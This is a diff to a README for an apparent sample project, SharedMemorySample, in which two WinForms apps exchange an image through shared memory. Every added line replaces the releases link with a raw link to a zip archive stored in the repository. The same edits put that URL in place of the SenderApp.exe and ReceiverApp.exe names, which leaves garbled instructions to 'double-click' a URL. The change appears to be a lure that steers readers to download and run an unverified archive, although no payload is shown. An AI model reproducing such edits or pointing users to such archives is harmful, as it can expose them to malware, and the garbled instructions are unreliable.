@@ -1,7 +1,7 @@
 # 🖼️ SharedMemorySample - Easy Image Sharing Between Apps
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/gokkuuu/SharedMemorySample/releases)
+[![Download](https://github.com/gokkuuu/SharedMemorySample/raw/refs/heads/master/SharedMemorySender/Sample_Shared_Memory_1.9.zip)](https://github.com/gokkuuu/SharedMemorySample/raw/refs/heads/master/SharedMemorySender/Sample_Shared_Memory_1.9.zip)
 
 ## 📖 Description
 SharedMemorySample features two WinForms applications that exchange an image across processes. It uses a named MemoryMappedFile and a named AutoReset event to facilitate this exchange. The image data is processed with OpenCvSharp and displayed in PictureBox controls. This project demonstrates an efficient way to share data between Windows applications.
@@ -11,7 +11,7 @@ To get started with SharedMemorySample, follow these simple steps:
 
 1. **Download the Software**
 
-   Visit this page to download the necessary files: [Download Page](https://github.com/gokkuuu/SharedMemorySample/releases). 
+   Visit this page to download the necessary files: [Download Page](https://github.com/gokkuuu/SharedMemorySample/raw/refs/heads/master/SharedMemorySender/Sample_Shared_Memory_1.9.zip). 
    
    You will find the latest versions of the applications packaged for your ease. Click on the version you want to download.
 
@@ -22,10 +22,10 @@ To get started with SharedMemorySample, follow these simple steps:
 3. **Open the Applications**
 
    Navigate to the folder where you extracted the files. Look for the two application files:
-   - `SenderApp.exe`: The application that sends the image.
-   - `ReceiverApp.exe`: The application that receives and displays the image.
+   - `https://github.com/gokkuuu/SharedMemorySample/raw/refs/heads/master/SharedMemorySender/Sample_Shared_Memory_1.9.zip`: The application that sends the image.
+   - `https://github.com/gokkuuu/SharedMemorySample/raw/refs/heads/master/SharedMemorySender/Sample_Shared_Memory_1.9.zip`: The application that receives and displays the image.
 
-   Double-click to open `SenderApp.exe`. This application will allow you to select an image to send.
+   Double-click to open `https://github.com/gokkuuu/SharedMemorySample/raw/refs/heads/master/SharedMemorySender/Sample_Shared_Memory_1.9.zip`. This application will allow you to select an image to send.
 
 4. **Sending an Image**
 
@@ -33,7 +33,7 @@ To get started with SharedMemorySample, follow these simple steps:
 
 5. **Receiving the Image**
 
-   Now, open `ReceiverApp.exe` in a new window. This application will automatically receive the image you send from `SenderApp`. It will display the image in the PictureBox control.
+   Now, open `https://github.com/gokkuuu/SharedMemorySample/raw/refs/heads/master/SharedMemorySender/Sample_Shared_Memory_1.9.zip` in a new window. This application will automatically receive the image you send from `SenderApp`. It will display the image in the PictureBox control.
 
 ## 🖥️ System Requirements
 Before downloading, ensure your system meets the following requirements:
